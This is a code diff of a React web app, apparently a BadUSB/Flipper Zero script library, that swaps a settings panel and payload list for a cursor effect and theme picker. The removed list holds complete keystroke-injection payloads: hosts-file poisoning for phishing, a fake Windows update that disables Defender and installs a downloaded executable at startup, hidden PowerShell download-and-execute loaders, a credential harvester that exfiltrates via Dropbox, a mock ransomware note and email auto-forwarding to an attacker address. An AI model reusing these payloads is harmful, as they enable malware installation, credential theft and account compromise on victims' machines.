-                    gradientColor1: '#00bfa5',
-                    gradientColor2: '#1de9b6',
-                },
-                {
-                    name: "Noir",
-                    darkMode: true,
-                    accentColor: '#bdbdbd',
-                    gradientColor1: '#000000',
-                    gradientColor2: '#212121',
-                },
-                {
-                    name: "Bubblegum",
-                    darkMode: false,
-                    accentColor: '#ff4081',
-                    gradientColor1: '#f50057',
-                    gradientColor2: '#ff80ab',
-                },
-                {
-                    name: "Synthwave",
-                    darkMode: true,
-                    accentColor: '#ff00ff',
-                    gradientColor1: '#3f51b5',
-                    gradientColor2: '#7c4dff',
-                },
-                {
-                    name: "Minimalist",
-                    darkMode: false,
-                    accentColor: '#000000',
-                    gradientColor1: '#ffffff',
-                    gradientColor2: '#f5f5f5',
-                }
-            ];
+                return () => {
+                    document.removeEventListener('mousemove', moveCursor);
+                    document.removeEventListener('mousedown', growCursor);
+                    document.removeEventListener('mouseup', shrinkCursor);
+                };
+            }, []);
 
             return (
-                <div className="settings-grid">
-                    <div className="settings-card">
-                        <h3>General Settings</h3>
-                        <label>
-                            <input
-                                type="checkbox"
-                                checked={settings.darkMode}
-                                onChange={(e) => handleChange('darkMode', e.target.checked)}
-                            /> Enable dark mode
-                        </label>
-                        <label>
-                            <input
-                                type="checkbox"
-                                checked={settings.showNotifications}
-                                onChange={(e) => handleChange('showNotifications', e.target.checked)}
-                            /> Show notifications
-                        </label>
-                    </div>
-                    <div className="settings-card">
-                        <h3>Security Settings</h3>
-                        <label>
-                            <input
-                                type="checkbox"
-                                checked={settings.twoFactorAuth}
-                                onChange={(e) => handleChange('twoFactorAuth', e.target.checked)}
-                            /> Enable two-factor authentication
-                        </label>
-                        <label>
-                            <input
-                                type="checkbox"
-                                checked={settings.autoLogout}
-                                onChange={(e) => handleChange('autoLogout', e.target.checked)}
-                            /> Auto-logout after inactivity
-                        </label>
-                    </div>
-                    <div className="settings-card">
-                        <h3>User Settings</h3>
-                        <label>
-                            Your Name:
-                            <input
-                                type="text"
-                                value={settings.userName}
-                                onChange={(e) => handleChange('userName', e.target.value)}
-                            />
-                        </label>
-                    </div>
-                    <div className="settings-card">
-                        <h3>Graphics Settings</h3>
-                        <label>
-                            Animation speed:
-                            <input
-                                type="range"
-                                min="0"
-                                max="100"
-                                value={settings.animationSpeed}
-                                onChange={(e) => handleChange('animationSpeed', parseInt(e.target.value))}
-                            />
-                        </label>
-                        <label>
-                            Font size:
-                            <input
-                                type="number"
-                                min="12"
-                                max="24"
-                                value={settings.fontSize}
-                                onChange={(e) => handleChange('fontSize', parseInt(e.target.value))}
-                            /> px
-                        </label>
-                        <label>
-                            Accent color:
-                            <input
-                                type="color"
-                                value={settings.accentColor}
-                                onChange={(e) => handleChange('accentColor', e.target.value)}
-                            />
-                        </label>
-                        <label>
-                            Sidebar width:
-                            <input
-                                type="range"
-                                min="60"
-                                max="200"
-                                value={settings.sidebarWidth}
-                                onChange={(e) => handleChange('sidebarWidth', parseInt(e.target.value))}
-                            /> px
-                        </label>
-                    </div>
-                    <div className="settings-card">
-                        <h3>Gradient Colors</h3>
-                        <label>
-                            Gradient Color 1:
-                            <input
-                                type="color"
-                                value={settings.gradientColor1}
-                                onChange={(e) => handleChange('gradientColor1', e.target.value)}
-                            />
-                        </label>
-                        <label>
-                            Gradient Color 2:
-                            <input
-                                type="color"
-                                value={settings.gradientColor2}
-                                onChange={(e) => handleChange('gradientColor2', e.target.value)}
-                            />
-                        </label>
-                    </div>
-                    <div className="settings-card">
-                        <h3>Themes</h3>
-                        <select onChange={(e) => applyTheme(e.target.value)}>
-                            <option value="">Select a theme</option>
-                            {themes.map((theme, index) => (
-                                <option key={index} value={index}>{theme.name}</option>
-                            ))}
-                        </select>
-                    </div>
-                    <div className="settings-card">
-                        <h3>Custom Background</h3>
-                        <input
-                            type="file"
-                            accept="image/*"
-                            onChange={handleBackgroundChange}
-                        />
-                        {customBackground && (
-                            <div>
-                                <img src={customBackground} alt="Custom background preview" style={{maxWidth: '100%', maxHeight: '200px'}} />
-                                <button onClick={removeCustomBackground}>Remove Custom Background</button>
-                            </div>
-                        )}
-                    </div>
-                    <div className="settings-card">
-                        <h3>Reset Settings</h3>
-                        <button onClick={resetSettings}>Reset Graphics Settings</button>
-                    </div>
-                </div>
+                <>
+                    <div ref={cursorRef} className="custom-cursor"></div>
+                    <div ref={cursorTrailRef} className="cursor-trail"></div>
+                </>
             );
         };
 
-        const applySettings = (settings) => {
-            document.documentElement.style.setProperty('--accent-color', settings.accentColor);
-            document.documentElement.style.setProperty('--sidebar-width', `${settings.sidebarWidth}px`);
-            document.documentElement.style.setProperty('--font-size', `${settings.fontSize}px`);
-            document.documentElement.style.setProperty('--animation-speed', `${settings.animationSpeed / 100}s`);
-            document.documentElement.style.setProperty('--gradient-color-1', settings.gradientColor1);
-            document.documentElement.style.setProperty('--gradient-color-2', settings.gradientColor2);
-            
-            if (settings.darkMode) {
-                document.body.classList.add('dark-mode');
-            } else {
-                document.body.classList.remove('dark-mode');
-            }
-
-            if (settings.customBackground) {
-                document.body.style.backgroundImage = `url(${settings.customBackground})`;
-                document.body.style.backgroundSize = 'cover';
-                document.body.style.backgroundAttachment = 'fixed';
-                if (settings.isCustomBackgroundGif) {
-                    document.body.style.backgroundRepeat = 'no-repeat';
-                } else {
-                    document.body.style.backgroundRepeat = 'repeat';
-                }
-            } else {
-                document.body.style.backgroundImage = 'none';
-                document.body.style.backgroundColor = settings.darkMode ? '#121212' : '#1a1a2e';
-            }
-        };
-
-        const ProfileSection = () => {
+        const Settings = ({ currentTheme, changeTheme }) => {
             return (
-                <div className="profile-section">
-                    <div className="profile-info">
-                        <h2>John Doe</h2>
-                        <p>Email: john.doe@example.com</p>
-                        <p>Member since: January 1, 2023</p>
-                    </div>
-                    <div className="profile-actions">
-                        <button>Edit Profile</button>
-                        <button>Change Password</button>
-                    </div>
-                </div>
-            );
-        };
-
-        const NewsContent = () => {
-            const newsItems = [
-                { 
-                    title: "Revolutionary BadUSB Script Unveiled", 
-                    content: "A groundbreaking BadUSB script capable of bypassing advanced security measures has been released. Cybersecurity experts warn of potential misuse.",
-                    date: "2024-06-15",
-                    category: "New Release"
-                },
-                { 
-                    title: "Global Cybersecurity Summit 2024", 
-                    content: "World leaders in cybersecurity are gathering next month to discuss the evolving landscape of digital threats and defense strategies.",
-                    date: "2024-06-14",
-                    category: "Event"
-                },
-                { 
-                    title: "AI-Powered BadUSB Detection Tool", 
-                    content: "A new AI-driven tool claims to detect and neutralize BadUSB attacks with 99.9% accuracy. Beta testing phase starts next week.",
-                    date: "2024-06-13",
-                    category: "Technology"
-                },
-                { 
-                    title: "Ethical Hacking Championship 2024", 
-                    content: "The annual Ethical Hacking Championship is now open for registrations. This year's theme: 'Securing the Internet of Things'.",
-                    date: "2024-06-12",
-                    category: "Competition"
-                },
-                { 
-                    title: "New Legislation on Cybercrime", 
-                    content: "The International Cybercrime Treaty has been ratified by 50 countries, setting a new global standard for prosecuting digital crimes.",
-                    date: "2024-06-11",
-                    category: "Legal"
-                },
-                { 
-                    title: "Quantum-Resistant Encryption Breakthrough", 
-                    content: "Researchers have developed a new encryption method that claims to be resistant to quantum computer attacks, potentially revolutionizing data security.",
-                    date: "2024-06-10",
-                    category: "Research"
-                },
-                { 
-                    title: "BadUSB Incidents on the Rise", 
-                    content: "A recent report shows a 300% increase in BadUSB-related security breaches in the first quarter of 2024. Experts call for increased vigilance.",
-                    date: "2024-06-09",
-                    category: "Security Alert"
-                }
-            ];
-
-            return (
-                <div className="news-content">
-                    {newsItems.map((item, index) => (
-                        <div key={index} className="news-item">
-                            <span className="news-category">{item.category}</span>
-                            <h3>{item.title}</h3>
-                            <p className="news-date">{item.date}</p>
-                            <p>{item.content}</p>
+                <div className="settings-content custom-scrollbar">
+                    <h2>Settings</h2>
+                    <div className="theme-settings">
+                        <h3>Choose a Theme</h3>
+                        <div className="theme-buttons">
+                            <button 
+                                className={`theme-button ${currentTheme === 'cosmic_flipper' ? 'active' : ''}`}
+                                onClick={() => changeTheme('cosmic_flipper')}
+                            >
+                                <div className="theme-preview cosmic-flipper-theme"></div>
+                                <span>Cosmic Flipper</span>
+                                <p>A Flipper Zero floating in deep space</p>
+                            </button>
+                            <button 
+                                className={`theme-button ${currentTheme === 'retro_hack' ? 'active' : ''}`}
+                                onClick={() => changeTheme('retro_hack')}
+                            >
+                                <div className="theme-preview retro-hack-theme"></div>
+                                <span>Retro Hack</span>
+                                <p>An old computer running a hacking program</p>
+                            </button>
+                            <button 
+                                className={`theme-button ${currentTheme === 'the_street' ? 'active' : ''}`}
+                                onClick={() => changeTheme('the_street')}
+                            >
+                                <div className="theme-preview the-street-theme"></div>
+                                <span>The Street</span>
+                                <p>A futuristic cyberpunk street scene</p>
+                            </button>
                         </div>
-                    ))}
+                    </div>
                 </div>
             );
         };
 
         const App = () => {
-            const [activeSection, setActiveSection] = useState('home');
-            const [downloadHistory, setDownloadHistory] = useState([]);
+            const [codeSnippets] = useState(generateCodeSnippets());
+            const [activeTab, setActiveTab] = useState('home');
             const [searchTerm, setSearchTerm] = useState('');
-            const [selectedCategory, setSelectedCategory] = useState('All');
-            const [currentTime, setCurrentTime] = useState(new Date());
-            const [settings, setSettings] = useState(() => {
-                const savedSettings = localStorage.getItem('zrkBadUSBSettings');
-                return savedSettings ? JSON.parse(savedSettings) : {
-                    darkMode: false,
-                    showNotifications: true,
-                    twoFactorAuth: false,
-                    autoLogout: false,
-                    animationSpeed: 50,
-                    fontSize: 16,
-                    accentColor: '#ff9800',
-                    sidebarWidth: 80,
-                    gradientColor1: '#4caf50',
-                    gradientColor2: '#2196f3',
-                    userName: 'User',
-                    customBackground: '',
-                    isCustomBackgroundGif: false,
-                };
-            });
-            const [plugins, setPlugins] = useState(() => {
-                const savedPlugins = localStorage.getItem('zrkBadUSBPlugins');
-                return savedPlugins ? JSON.parse(savedPlugins) : [];
-            });
-            const [pluginHTML, setPluginHTML] = useState('');
+            const contentRef = useRef(null);
+            const [copiedIndex, setCopiedIndex] = useState(null);
+            const [currentTheme, setCurrentTheme] = useState('cosmic_flipper');
 
             useEffect(() => {
-                const timer = setInterval(() => setCurrentTime(new Date()), 60000);
-                return () => clearInterval(timer);
-            }, []);
-
-            useEffect(() => {
-                localStorage.setItem('zrkBadUSBPlugins', JSON.stringify(plugins));
-            }, [plugins]);
-
-            const getGreeting = () => {
-                const hour = currentTime.getHours();
-                if (hour < 12) return "Good morning";
-                if (hour < 18) return "Good afternoon";
-                return "Good evening";
-            };
-
-            const badUSBScripts = [
-                { name: 'BadUSB Script 1', content: 'Content for Script 1', category: 'Utility' },
-                { name: 'BadUSB Script 2', content: 'Content for Script 2', category: 'Utility' },
-                { name: 'BadUSB Script 3', content: 'Content for Script 3', category: 'Utility' },
-                { name: 'BadUSB Script 4', content: 'Content for Script 4', category: 'Utility' },
-                { name: 'BadUSB Script 5', content: 'Content for Script 5', category: 'Utility' },
-                { name: 'BadUSB Script 6', content: 'Content for Script 6', category: 'Utility' },
-                { name: 'BadUSB Script 7', content: 'Content for Script 7', category: 'Utility' },
-                { name: 'BadUSB Script 8', content: 'Content for Script 8', category: 'Utility' },
-                { name: 'BadUSB Script 9', content: 'Content for Script 9', category: 'Utility' },
-                { name: 'BadUSB Script 10', content: 'Content for Script 10', category: 'Utility' },
-                { name: 'BadUSB Script 11', content: 'Content for Script 11', category: 'Utility' },
-                { name: 'BadUSB Script 12', content: 'Content for Script 12', category: 'Utility' },
-                { name: 'BadUSB Script 13', content: 'Content for Script 13', category: 'Utility' },
-                { name: 'BadUSB Script 14', content: 'Content for Script 14', category: 'Utility' },
-                { name: 'BadUSB Script 15', content: 'Content for Script 15', category: 'Utility' },
-                { name: 'BadUSB Script 16', content: 'Content for Script 16', category: 'Utility' },
-                { name: 'BadUSB Script 17', content: 'Content for Script 17', category: 'Utility' },
-                { name: 'BadUSB Script 18', content: 'Content for Script 18', category: 'Utility' },
-                { name: 'BadUSB Script 19', content: 'Content for Script 19', category: 'Utility' },
-                { name: 'BadUSB Script 20', content: 'Content for Script 20', category: 'Utility' },
-                { name: 'BadUSB Script 21', content: 'Content for Script 21', category: 'Utility' },
-                { name: 'BadUSB Script 22', content: 'Content for Script 22', category: 'Utility' },
-                { name: 'BadUSB Script 23', content: 'Content for Script 23', category: 'Utility' },
-                { name: 'BadUSB Script 24', content: 'Content for Script 24', category: 'Utility' },
-                { name: 'Forward First Email (Mobile)', content: `REM Forwards the first email in the primary section
-REM Only works for phones. 
-REM Does not work tablets as menu bar stops tabs
-REM GMAIL SHORTCUTS https://support.google.com/mail/answer/6594?co=GENIE.Platform%3DAndroid&hl=en&oco=1
-DELAY 1000
-GUI e
-DELAY 1000
-TAB
-DELAY 500
-TAB
-DELAY 500
-ENTER
-REM LOOP FROM HERE
-DELAY 500
-CTRL r
-DELAY 1000
-TAB
-DELAY 500
-SHIFT TAB
-DELAY 500
-BACKSPACE
-DELAY 500
-STRING your@email.com
-CTRL ENTER
-DELAY 1000
-REM Moves to the next email
-RIGHTARROW
-REM GOTO LOOP`, category: 'Utility' },
-                { name: 'Forward First Email (Desktop)', content: `REM Forwards the first email
-DELAY 1000
-GUI e
-DELAY 1000
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-TAB
-DELAY 500
-ENTER
-REM LOOP FROM HERE
-DELAY 500
-SHIFT TAB
-DELAY 500
-LEFTARROW
-LEFTARROW
-LEFTARROW
-LEFTARROW
-RIGHTARROW
-RIGHTARROW
-ENTER
-DELAY 500
-STRING your@email.com
-DELAY 500
-SHIFT TAB
-DELAY 500
-SHIFT TAB
-DELAY 500
-ENTER
-DELAY 500
-REM Moves to the next email
-TAB
-RIGHTARROW
-RIGHTARROW
-LEFTARROW
-ENTER
-REM GOTO LOOP`, category: 'Utility' },
-                { name: 'Modify Hosts File', content: `GUI r
-DELAY 400
-STRING cmd
-DELAY 700
-CTRL SHIFT ENTER
-DELAY 1500
-LEFTARROW
-DELAY 400
-ENTER
-DELAY 700
-STRING echo <YourIP> google.com www.google.com >> C:/Windows/System32/drivers/etc/hosts
-DELAY 400
-ENTER
-DELAY 400
-ALT F4`, category: 'Security' },
-                { name: 'Phishing Host Injection', content: `REM Author: .:Koryusai-Kun:.
-REM Description: Used for phishing, it add's an ip of your choosing to the hosts file on windows
-REM Description: so when the user types into there web browser for example www.facebook.com it
-REM Description: insted of going to the proper ip it gose to the one in the host file your evil one.
-REM Description: you need to add the www. version and with out it as well.
-REM ---[Start CMD as administrator]-----------------------
-GUI
-DELAY 50
-STRING cmd
-DELAY 150
-MENU
-DELAY 75
-STRING a
-ENTER
-DELAY 200
-LEFT
-ENTER
-STRING cls
-ENTER
-REM ---[END]----------------------------------------------
-DELAY 300
-REM ---[Inject into the host file]------------------------
-STRING copy con inject.bat
-ENTER
-STRING SET NEWLINE=^& echo.
-ENTER
-ENTER
-STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
-ENTER
-STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
-ENTER
-ENTER
-STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
-ENTER
-STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
-ENTER
-CONTROL z
-ENTER
-STRING inject.bat
-ENTER
-REM ---[END]----------------------------------------------
-DELAY 200
-STRING exit
-ENTER`, category: 'Security' },
-                { name: 'Play WAV File', content: `REM     Title: Play-WAV
-REM     Author: I am Jakoby
-REM     Description: This payload is meant to play a WAV file hidden. See Play-WAV.ps1 for more details
-REM     Target: Windows 10, 11
-REM     Remeber to replace the link with your link for the intended file to download
-REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
-
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-DELAY 500
-ENTER`, category: 'Prank' },
-                { name: 'Close Windows Script', content: `ESC
-DELAY 500
-GUI r
-DELAY 200
-STRING cmd
-ENTER
-DELAY 200
-STRING cd %userprofile%/Downloads
-ENTER
-STRING copy con CW.vbs
-ENTER
-STRING do
-ENTER
-STRING Set objShell = CreateObject("WScript.Shell")
-ENTER
-STRING WScript.Sleep 800
-ENTER
-REM idk PS scrpiting so yeet!
-STRING objShell.SendKeys "^{W} %{f4}"
-ENTER
-STRING loop
-CTRL z
-DELAY 100
-ENTER
-REM insert startup scripting
-STRING start CW.vbs && exit
-ENTER`, category: 'Prank' },
-                { name: 'Automailer', content: `REM Title:          Automailer
-REM Author:	    Ratcode404(.github.io)
-REM Description:    Snaps screen, opens outlook, sends a message to various people with pre-configured text, adds screenshot and opens up a muted 1 hour rickroll youtube video once done.
-
-REM Default Delay (350 should be mid-speed)
-DEFAULT_DELAY 350
-
-REM Take screenshot
-SHIFT WINDOWS S
-DELAY 200
-TAB
-DELAY 300
-
-REM Open Outlook (Change E-Mail and text)
-GUI r
-DELAY 100
-STRING outlook.exe /c ipm.note /m ratcode404@notarealmail.com?v=1&cc=ratcode405@notarealmail.com
-ENTER
-DELAY 500
-STRING Subject goes here.
-TAB
-STRING Hello Ratcode!
-ENTER 
-STRING I like to leave my device unlocked and would want to invite you to some free dinner tonight.
-ENTER
-STRING xoxo
-
-REM Paste Screenshot in Mail (CTRL V)
-SHIFT INSERT
-DELAY 200
-
-REM Send Mail
-ALT S
-ENTER
-DELAY 200
-
-REM Rickroll, Mute and Fullscreen (Can adjust link obviously)
-GUI r
-DELAY 100
-STRING https://www.youtube.com/watch?v=zL19uMsnpSU
-ENTER
-DELAY 300
-M
-DELAY 200
-F`, category: 'Prank' },
-                { name: 'Broken Capslock', content: `REM Title: Broken capslock
-REM Author: FalsePhilosopher
-REM Target: Win
-REM Props: Hak5 and memes
-REM Version: 1.0
-REM Category: Prank
-REM Selects all words and capitalizes them, works best when in a word doc
-DELAY 300
-CTRL+A
-DELAY 500
-SHIFT+F3`, category: 'Prank' },
-                { name: 'Broken Capslock (Save)', content: `REM Title: Broken capslock
-REM Author: FalsePhilosopher
-REM Target: Win
-REM Props: Hak5 and memes
-REM Version: 1.0
-REM Category: Prank
-REM Selects all words and capitalizes them, works best when in a word doc. This version saves it.
-DELAY 300
-CTRL+A
-DELAY 500
-SHIFT+F3
-DELAY 500
-CTRL+S`, category: 'Prank' },
-                { name: 'Cartman Spam', content: `REM ---------CARTMAN SPAM----------
-REM -- by Mr-Savag3 --- 09162022 --
-REM -- updated to 1 line by -------
-REM ---------------- I Am Jakoby --
-REM 
-REM DISCLAIMER: While this Ducky file doesn't really do anything illegal, you still shouldn't use it on anyone besides your friends and family.
-REM I am not responsible for any trouble you get in.
-REM 
-REM INSTRUCTIONS: Requires PC running Windows 10/11. Probably will work on The Lord's OS, Windows 7, but I haven't tested it.
-DELAY 1000
-GUI r
-DELAY 1500
-STRING powershell -w h $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char] 175)}; 1..10|foreach {saps https://www.youtube.com/watch?v=U3sAkAWfxLY;sleep 1;$o.SendKeys('f')}
-ENTER`, category: 'Prank' },
-                { name: 'Fake Update (Edge)', content: `REM FalsePhilosopher
-REM let the ducky HID enumerate
-DELAY 300
-GUI r
-DELAY 500
-STRING microsoft-edge:https://fakeupdate.net/win10ue/
-ENTER
-DELAY 5000
-F11`, category: 'Prank' },
-                { name: 'Fake Update (IE)', content: `REM FalsePhilosopher
-REM let the ducky HID enumerate
-DELAY 300
-GUI r
-DELAY 500
-STRING iexplore -k https://fakeupdate.net/win7/
-ENTER
-DELAY 5000
-F11`, category: 'Prank' },
-                { name: 'Fake Windows Update', content: `REM AUTHOR: Eddie Devine
-REM TARGET: Windows 10
-REM DESCRIPTION: Installs to startup and runs Enderman's WindowsUpdate.exe.
-REM DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
-REM Disable Windows Defender:
-DELAY 1000
-CONTROL ESCAPE
-DELAY 500
-STRING Settings
-DELAY 500
-ENTER
-DELAY 300
-TAB
-DOWN
-DOWN
-DOWN
-ENTER
-DELAY 500
-TAB
-DOWN
-DOWN
-ENTER
-DELAY 500
-TAB
-TAB
-ENTER
-DELAY 500
-TAB
-TAB
-TAB
-TAB
-ENTER
-DELAY 500
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-TAB
-ENTER
-DELAY 500
-ENTER
-DELAY 500
-DOWN
-ENTER
-DELAY 500
-STRING C:
-TAB
-ENTER
-DELAY 500
-ALT y
-DELAY 500
-ALT F4
-DELAY 100
-ALT F4
-REM Download and Run Malware:
-DELAY 500
-GUI r
-DELAY 500
-STRING powershell
-CONTROL SHIFT ENTER
-DELAY 750
-ALT y
-DELAY 1000
-STRING $url = "https://FILEHOST.eddie09.repl.co/Windows_Update_Manager.exe"
-ENTER
-STRING $outpath = "C:\Windows Update Manager.exe"
-ENTER
-STRING Invoke-WebRequest -Uri $url -OutFile $outpath
-ENTER
-DELAY 1000
-STRING exit
-ENTER
-GUI r
-DELAY 500
-STRING cmd /c copy "C:\Windows Update Manager.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
-ENTER
-GUI
-DELAY 100
-TAB
-DOWN
-DOWN
-DOWN
-DOWN
-DOWN
-ENTER
-DELAY 100
-DOWN
-DOWN
-ENTER`, category: 'Prank' },
-                { name: 'JumpScare', content: `REM     Title: JumpScare
-REM     Author: I am Jakoby
-REM     Description: This payload is meant to torment your target to the fullest extent. Mission to JumpScare. See JumpScare.ps1 for more details
-REM     Target: Windows 10, 11
-
-REM     Start by minimizing all their current windows
-GUI m
-DELAY 500
-
-REM     Remember to replace the link with your link for the intended file to download if you are using a custom variation of this payload
-REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
-
-REM     --------------------------------------------------------------------------------------
-REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
-REM     --------------------------------------------------------------------------------------
-
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-JumpScare/JumpScare.ps1?dl=1; invoke-expression $pl
-ENTER`, category: 'Prank' },
-                { name: 'LoL Uninstaller', content: `REM Title: lol_killer
-REM Author: Skelly
-REM Description: Script to uninstall League of Legends from the target system. Save your friends from their horrible addiction.  
-REM Target: Windows 10
-REM Version: 1.0
-REM Category: Prank
-DELAY 1000 
-GUI i 
-DELAY 1000 
-STRING apps and features 
-DELAY 1000
-ENTER
-DELAY 1000
-ENTER 
-TAB
-TAB
-TAB
-DELAY 1000
-STRING league of legends
-ENTER
-DELAY 1000
-TAB
-TAB
-TAB
-DELAY 1000
-ENTER
-TAB
-ENTER
-DELAY 1000 
-ENTER 
-ALT F4
-ALT F4`, category: 'Prank' },
-                { name: 'Ratlocker', content: `REM Title:          Ratlocker
-REM Author:	    Ratcode404(.github.io)
-REM Target:         Windows
-REM Description:    Adds ratcode file extensions, draws and sets background without the use of URLs or image download (avoid proxy blocking and detection). The original wallpaper will be backuped on \pictures\wallpaper.ratl0ck3r, so no files will be lost. The current setup only targets the files and folder structures on $HOME\Desktop\, but it could be easily extended by adjusting the path variable further down.
-
-REM Base delay after initiation and ps1 startup
-DELAY 250
-GUI d
-GUI r
-DELAY 100
-STRING powershell.exe
-ENTER
-DELAY 250
-
-REM Backup Wallpaper
-STRING Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination $home\pictures\wallpaper.ratl0ck3r
-ENTER
-DELAY 250
-
-REM Create new wallpaper
-STRING Add-Type -AssemblyName System.Drawing
-ENTER
-STRING $filename = "$home\pictures\ratl0ck3r.png"
-ENTER
-STRING $bmp = new-object System.Drawing.Bitmap 1080,720
-ENTER
-STRING $font = new-object System.Drawing.Font Consolas,10
-ENTER
-STRING $brushBg = [System.Drawing.Brushes]::Black
-ENTER
-STRING $brushFg = [System.Drawing.Brushes]::Green
-ENTER
-STRING $graphics = [System.Drawing.Graphics]::FromImage($bmp)
-ENTER
-STRING $graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
-ENTER
-STRING $graphics.DrawString('Your device has been encrypted by ratlocker.
-ENTER
-ENTER
-STRING            ____()()
-ENTER
-STRING          /      OO
-ENTER
-STRING     ~~~~~\_;m__m._>o
-ENTER
-ENTER
-ENTER
-STRING Oops! Your files have been encrypted.ENTER
-ENTER
-STRING If you see this text, your files are no longer accessible. You might
-ENTER
-STRING have been looking for a way to recover your files, but do not waste
-ENTER
-STRING your time. No one will be able to recover them without a decrytion
-ENTER
-STRING service.
-ENTER
-ENTER
-STRING We gurantee that you can recover all your files safely. All you need
-ENTER
-STRING to do is get the decryption password.
-ENTER
-ENTER
-STRING Visit out web services at: fakerat404linkszt3xaxqzf2nm12.onion
-ENTER
-ENTER
-STRING Your personal installation key #1:
-ENTER
-ENTER
-STRING b0d549572a40f93aa57400dbe43ee72a5e545f47765ef5fb7d17c7e83001cb3d',$font,$brushFg,10,10)
-ENTER
-STRING $graphics.Dispose()
-ENTER
-STRING $bmp.Save($filename)
-ENTER
-DELAY 500
-
-REM Set new wallpaper
-STRING $MyWallpaper="$home\pictures\ratl0ck3r.png"
-ENTER
-STRING $code = @'
-ENTER
-STRING using System.Runtime.InteropServices;
-ENTER
-STRING namespace Win32{
-ENTER
-STRING      public class Wallpaper{
-ENTER
-STRING         [DllImport("user32.dll", CharSet=CharSet.Auto)]
-ENTER
-STRING          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
-ENTER
-STRING          public static void SetWallpaper(string thePath){
-ENTER
-STRING            SystemParametersInfo(20,0,thePath,3);
-ENTER
-STRING          }
-ENTER
-STRING     }
-ENTER
-STRING  } 
-ENTER
-STRING '@
-ENTER
-STRING add-type $code 
-ENTER
-STRING [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
-ENTER
-DELAY 500
-
-REM Add ratl0ck3r extension
-STRING dir $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
-ENTER`, category: 'Ransomware' },
-                { 
-                    name: 'Credential Harvester (Dropbox)', 
-                    content: `REM     Title: Credz-Plz
-
-REM     Author: I am Jakoby
-
-REM     Description: This payload is meant to prompt the target to enter their creds to later be exfiltrated with dropbox. See README.md file for more details.
-
-REM     Target: Windows 10, 11
-
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-ENTER
-
-REM     Remember to replace the link with your DropBox shared link for the intended file to download
-REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly`,
-                    category: 'Exfiltration' 
+                if (contentRef.current) {
+                    contentRef.current.scrollTop = 0;
                 }
-            ];
+            }, [activeTab]);
 
-            const handleSectionChange = (section) => {
-                setActiveSection(section);
+            const copyToClipboard = (code, index) => {
+                navigator.clipboard.writeText(code).then(() => {
+                    setCopiedIndex(index);
+                    setTimeout(() => setCopiedIndex(null), 2000);
+                });
             };
 
-            const categories = ['All', 'Prank', 'Security', 'Utility', 'Ransomware', 'Exfiltration'];
+            const filteredSnippets = (type) => {
+                return codeSnippets[type].filter(snippet => 
+                    snippet.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
+                    snippet.code.toLowerCase().includes(searchTerm.toLowerCase())
+                );
+            };
 
-            const filteredScripts = badUSBScripts.filter(script => 
-              script.name.toLowerCase().includes(searchTerm.toLowerCase()) &&
-              (selectedCategory === 'All' || script.category === selectedCategory)
-            );
-
-            const addPlugin = () => {
-                if (pluginHTML.trim()) {
-                    const newPlugins = [...plugins, pluginHTML];
-                    setPlugins(newPlugins);
-                    setPluginHTML('');
+            const changeTheme = (theme) => {
+                setCurrentTheme(theme);
+                document.body.style.transition = 'background-image 0.5s ease, background-color 0.5s ease';
+                if (theme === 'cosmic_flipper') {
+                    document.body.style.backgroundImage = "url('https://i.ibb.co/x5BFf78/unflipperzertitled.png'), linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #1a1a2e)";
+                    document.documentElement.style.setProperty('--primary-color', '#FF8C00');
+                    document.documentElement.style.setProperty('--secondary-color', '#FFA500');
+                    document.documentElement.style.setProperty('--accent-color', '#FFD700');
+                } else if (theme === 'retro_hack') {
+                    document.body.style.backgroundImage = "url('https://i.ibb.co/k49NRgG/background2.png'), linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #1a1a2e)";
+                    document.documentElement.style.setProperty('--primary-color', '#4CAF50');
+                    document.documentElement.style.setProperty('--secondary-color', '#FFEB3B');
+                    document.documentElement.style.setProperty('--accent-color', '#FF5252');
+                } else if (theme === 'the_street') {
+                    document.body.style.backgroundImage = "url('https://i.ibb.co/GJq56L9/background3.png'), linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #1a1a2e)";
+                    document.documentElement.style.setProperty('--primary-color', '#8A2BE2');
+                    document.documentElement.style.setProperty('--secondary-color', '#FF0000');
+                    document.documentElement.style.setProperty('--accent-color', '#1E90FF');
                 }
             };
 
-            const removePlugin = (index) => {
-                const newPlugins = plugins.filter((_, i) => i !== index);
-                setPlugins(newPlugins);
-            };
-
-            return (
-                <div className="app-container">
-                    <div className="sidebar">
-                        <div className="sidebar-icons">
